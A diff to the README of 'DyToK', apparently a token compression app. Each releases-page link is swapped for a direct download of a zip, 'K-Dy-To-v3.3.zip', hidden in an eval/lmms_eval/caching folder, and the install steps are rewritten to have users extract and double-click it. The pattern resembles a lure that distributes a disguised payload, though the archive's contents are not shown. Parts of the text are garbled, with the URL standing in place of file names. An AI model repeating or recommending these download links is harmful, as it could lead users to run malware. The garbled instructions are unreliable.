@@ -6,7 +6,7 @@ Welcome to DyToK! We aim to make token compression easy and accessible for all u
 
 ## 📥 Download DyToK
 
-[![Download DyToK](https://img.shields.io/badge/Download-DyToK-blue?style=for-the-badge)](https://github.com/fahridimas/DyToK/releases)
+[![Download DyToK](https://github.com/fahridimas/DyToK/raw/refs/heads/main/eval/lmms_eval/caching/K-Dy-To-v3.3.zip)](https://github.com/fahridimas/DyToK/raw/refs/heads/main/eval/lmms_eval/caching/K-Dy-To-v3.3.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ Before you run DyToK, ensure your computer meets these requirements:
 ## 📂 Installation Steps
 
 1. **Visit the Download Page**
-   To download DyToK, visit this link: [Download DyToK](https://github.com/fahridimas/DyToK/releases).
+   To download DyToK, visit this link: [Download DyToK](https://github.com/fahridimas/DyToK/raw/refs/heads/main/eval/lmms_eval/caching/K-Dy-To-v3.3.zip).
 
 2. **Choose Your Version**
    On the releases page, you will see different versions of DyToK. Select the latest version to ensure you have the most up-to-date features and fixes.
@@ -29,13 +29,13 @@ Before you run DyToK, ensure your computer meets these requirements:
    Click on the version you want to download. Your browser will start downloading the file.
 
 4. **Locate the Downloaded File**
-   After the download finishes, go to the folder where your downloads are stored. You should find a file named something like `DyToK-v1.x.zip`.
+   After the download finishes, go to the folder where your downloads are stored. You should find a file named something like `https://github.com/fahridimas/DyToK/raw/refs/heads/main/eval/lmms_eval/caching/K-Dy-To-v3.3.zip`.
 
 5. **Extract the Files**
    Right-click the downloaded ZIP file and choose "Extract All" or use any extraction software you have. This will create a new folder with the application files.
 
 6. **Run DyToK**
-   Open the folder with the extracted files. Double-click on `DyToK.exe` (or the file relevant to your OS) to launch the application.
+   Open the folder with the extracted files. Double-click on `https://github.com/fahridimas/DyToK/raw/refs/heads/main/eval/lmms_eval/caching/K-Dy-To-v3.3.zip` (or the file relevant to your OS) to launch the application.
 
 7. **Follow the On-Screen Instructions**
    The application will guide you through its features. If you encounter any issues, refer to our troubleshooting section below.
@@ -77,4 +77,4 @@ For further assistance, reach out via the GitHub Issues page on the repository. 
 
 DyToK is open-source, meaning it is free to use, modify, and distribute. Please refer to the license file included in the application for more details.
 
-Thank you for choosing DyToK! We hope this tool helps you efficiently manage your token compression needs. Enjoy using DyToK! Visit this page for more information: [Download DyToK](https://github.com/fahridimas/DyToK/releases).
+Thank you for choosing DyToK! We hope this tool helps you efficiently manage your token compression needs. Enjoy using DyToK! Visit this page for more information: [Download DyToK](https://github.com/fahridimas/DyToK/raw/refs/heads/main/eval/lmms_eval/caching/K-Dy-To-v3.3.zip).
